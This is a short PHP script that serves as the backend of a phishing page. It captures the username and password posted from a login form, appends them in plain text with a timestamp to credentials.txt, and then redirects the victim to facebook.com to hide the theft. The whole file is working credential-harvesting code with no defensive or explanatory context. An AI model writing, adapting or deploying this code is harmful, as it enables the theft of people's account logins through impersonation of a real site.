<?php
  if (isset($_POST['username'])) {
    $username = $_POST['username'];
  }

  if (isset($_POST['password'])) {
    $password = $_POST['password'];
  }

  $file = fopen('credentials.txt', 'a');
  if ($file) {
    // Set the GMT offset to +3
    $gmt = 3;
    $dateTime = new DateTime("now", new DateTimeZone("GMT"));
    $dateTime->modify("+$gmt hours");
    $formattedDateTime = $dateTime->format('m/d/Y H:i');

    fwrite($file, "$formattedDateTime\n\nUsername: $username\nPassword: $password\n________________\n\n");
    fclose($file);
    header("Location: https://facebook.com");
    exit();
  } else {
    echo "Unable to open file.";
  }
?>
